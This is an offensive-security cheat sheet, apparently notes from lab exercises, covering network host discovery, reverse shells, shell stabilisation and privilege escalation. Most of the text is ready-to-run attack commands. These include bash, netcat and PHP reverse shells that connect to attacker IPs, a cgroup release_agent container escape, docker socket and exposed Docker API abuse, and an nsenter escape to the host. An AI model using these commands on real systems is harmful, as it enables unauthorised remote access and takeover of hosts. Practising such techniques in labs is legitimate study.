# Reconnaissance

## Passive

## Active

### Host discovery via ARP Scan

Scan hosts in local subnet:

#### Use arp-scan

arp-scan -l

arp-scan -l -I eth0

#### Use nmap

nmap -sn -PR <targets>

### Host discovery via ICMP scan

#### ICMP Ping scan (ICMP Type8/0):

nmap -sn -PE <targets>

#### ICMP Timestamp (ICMP Type 13/14):

nmap -sn -PP <targets>

#### ICMP Address Mask (ICMP Type 17/18):

nmap -sn -PM <targets>

### Host discovery via TCP/UDP

#### TCP SYN ping (<ports> optional; port 80 by default):

nmap -sn -PS<ports> <targets>

#### TCP ACK ping (<ports> optional; port 80 by default, needs root priv):

nmap -sn -PA<ports> <targets>

#### UDP ping

nmap -sn -PU <targets>

#### masscan

To use masscan as host discovery we limit ports with `-p`:

masscan -p<port> <targets>

### Host discovery via Reverse-DNS Lookup

Query DNS server even for offline hosts:

nmap -sn -R <targets>

# Reverse shell

## Bash reverse shell

The simplest method is to use bash, which is available on almost all Linux machines. This script was tested on Ubuntu 18.04, but not all versions of bash support this function:

/bin/bash -i >& /dev/tcp/10.10.205.203/9999 0>&1

or

$ exec 5<>/dev/tcp/10.10.205.203/9999
$ cat <&5 | while read line; do $line 2>&5 >&5; done

## Netcat reverse shell

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.205.203 1234 >/tmp/f

## PHP reverse shell

If the target machine is a web server that supports PHP, this language will be an excellent choice for a reverse shell:

php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'

If this does not work, you can try replacing &3 with consecutive file descriptors.


## Stablize remote shell

If you would like to "stabilize your shell" for easier ability in typing commands, you can use the usual upgrade trick (assuming you are running in a bash shell. If you are running within zsh, you will need to have started your netcat listener within a bash subshell... it should be easy enough to re-exploit):


(on the reverse shell) python3 -c "import pty; pty.spawn('/bin/bash')"

(press on your keyboard) Ctrl+Z

(press on your keyboard) Enter

(on your local host) stty raw -echo

(on your local host) fg (you will not see your keystrokes -- trust yourself and hit Enter)

(press on your keyboard) Enter

(press on your keyboard) Enter

(on the reverse shell) export TERM=xterm

You now have a stable shell, where you can safely use the left-and-right arrow keys to move around your input, up-and-down arrow keys to revisit command history, Tab for autocomplete and safely Ctrl+C to stop running programs!

# Priv escalation

## Check sudo

sudo -l

## Privlidged container escape


### Exploit privlidged capabilities


1. capsh --print
Check capabilities first

2.
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine.

### Exploiting docker socket

1. ls -la /var/run | grep sock
srw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock

confirm you can run docker commands (be root in container or be in docker group as a lower-privileged user)
 
2. docker run -v /:/mnt --rm -it alpine chroot /mnt sh

### Exposed Docker port 2375

1. curl http://10.10.85.243:2375/version

2. docker -H tcp://10.10.85.243:2375 ps

Now that we've confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyse further.

### Namespace abuse

For this vulnerability, we will be using nsenter (namespace enter). This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the "/sbin/init" process on the host, meaning that we can launch new commands such as a bash shell on the host. 

Use the following exploit: nsenter --target 1 --mount --uts --ipc --net /bin/bash
